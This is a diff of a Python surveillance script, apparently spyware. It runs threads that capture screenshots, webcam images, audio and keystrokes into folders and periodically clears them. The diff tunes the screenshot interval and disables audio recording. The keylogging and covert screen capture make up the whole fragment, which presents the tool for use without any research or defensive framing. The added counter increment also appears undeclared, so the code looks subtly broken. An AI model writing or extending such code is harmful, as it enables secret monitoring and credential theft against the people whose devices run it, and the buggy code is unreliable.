@@ -46,12 +46,19 @@ if not os.path.exists(audio_folder):
 if not os.path.exists(keylog_folder):
     os.makedirs(keylog_folder)
 
+def check_image_size(image_path):
+    return os.path.getsize(image_path) > 2 * 1024 * 1024  # 2MB
+
 def capture_and_save_screen(output_folder):
     while True:
         current_time = datetime.now().strftime("%d%m%Y_%H%M%S")
         with mss.mss() as sct:
             screenshot_path = os.path.join(output_folder, f"screenshot_{current_time}.png")
             sct.shot(output=screenshot_path)
+            screenshot_count += 1
+        # Kiểm tra dung lượng ảnh đầu tiên
+        if screenshot_count == 1 and check_image_size(screenshot_path):
+            save_interval = 5
         time.sleep(save_interval)
 
 def capture_and_save_webcam(output_folder):
@@ -280,12 +287,12 @@ def keylog_join():
 
 screen_thread = Thread(target=capture_and_save_screen, args=(screenshots_folder,))
 # webcam_thread = Thread(target=capture_and_save_webcam, args=(webcam_folder,))
-audio_thread = Thread(target=record_and_save_audio, args=(audio_folder,))
+# audio_thread = Thread(target=record_and_save_audio, args=(audio_folder,))
 keylogger_thread = Thread(target=keylog_join)
 
 screen_thread.start()
 # webcam_thread.start()
-audio_thread.start()
+# audio_thread.start()
 keylogger_thread.start()
 
 while True:
@@ -298,5 +305,5 @@ while True:
     
     delete_all_files(screenshots_folder)
     # delete_all_files(webcam_folder)
-    delete_all_files(audio_folder)
+    # delete_all_files(audio_folder)
     delete_all_files(keylog_folder)
